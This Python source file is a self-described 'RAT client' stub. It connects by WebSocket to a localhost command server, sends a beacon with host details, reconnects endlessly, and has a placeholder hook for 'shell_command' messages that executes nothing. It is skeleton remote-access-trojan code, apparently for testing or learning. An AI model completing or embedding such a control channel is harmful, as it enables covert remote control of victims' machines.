import json
import uuid
import time
import argparse
import threading
import websocket


SERVER_URL = "ws://localhost:8080/ws/seeker"
RECONNECT_DELAY = 5

seconds_disconnected = 0
client_uuid = None


def on_message(ws, message):
    print(f"[Server] {message}")
    try:
        data = json.loads(message)
        if data.get("type") == "shell_command":
            ...
    except json.JSONDecodeError:
        print("[Error] Failed to decode server message.")


def on_error(ws, error):
    print(f"[WebSocket Error] {error}")


def on_close(ws, close_status_code, close_msg):
    print("[WebSocket] Connection closed.")


def on_open(ws):
    global seconds_disconnected
    seconds_disconnected = 0
    print("[WebSocket] Connected.")

    rat_info = {
        "id": client_uuid,
        "name": "TestRat",
        "os": "Windows",
        "ip": "192.168.1.100",
        "metadata": {"version": "1.0"}
    }

    ws.send(json.dumps(rat_info))


def run_websocket():
    global seconds_disconnected

    while True:
        ws = websocket.WebSocketApp(
            SERVER_URL,
            on_open=on_open,
            on_message=on_message,
            on_error=on_error,
            on_close=on_close
        )

        ws.run_forever()

        seconds_disconnected += RECONNECT_DELAY
        print(f"[Reconnect] Lost connection. Retrying in {RECONNECT_DELAY}s (disconnected for {seconds_disconnected}s)...")
        time.sleep(RECONNECT_DELAY)


def parse_arguments():
    parser = argparse.ArgumentParser(description="RAT client")
    parser.add_argument("--uuid", type=str, help="Optional UUID for this RAT client")
    return parser.parse_args()


def main():
    global client_uuid

    args = parse_arguments()
    client_uuid = args.uuid or str(uuid.uuid4())
    print(f"[Info] Using UUID: {client_uuid}")

    thread = threading.Thread(target=run_websocket, daemon=True)
    thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[Shutdown] Exiting client.")

if __name__ == "__main__":
    main()
